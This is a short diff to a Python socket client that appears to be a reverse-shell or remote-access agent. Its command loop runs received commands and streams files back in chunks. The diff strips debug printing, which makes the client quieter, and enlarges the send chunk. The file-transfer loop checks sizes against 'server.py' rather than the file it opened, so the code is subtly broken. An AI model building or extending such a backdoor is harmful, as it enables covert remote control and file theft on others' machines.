@@ -47,9 +47,6 @@ def command(s):
         try:
             cmd = s.recv(10000).decode()
 
-            if 'areualive?' != cmd:
-                print(cmd)
-
             if cmd == "":
                 s.send(b"No command send")
             elif "cd" in cmd:
@@ -61,8 +58,7 @@ def command(s):
                 f = open(file_path, "rb")
                 data_check = 0
                 while data_check != int(str(os.path.getsize("server.py"))):
-                    data = f.read(1024)
-                    print(str(len(data)))
+                    data = f.read(5000)
                     s.send(data)
                     data_check = data_check + int(len(data))
                 f.close()
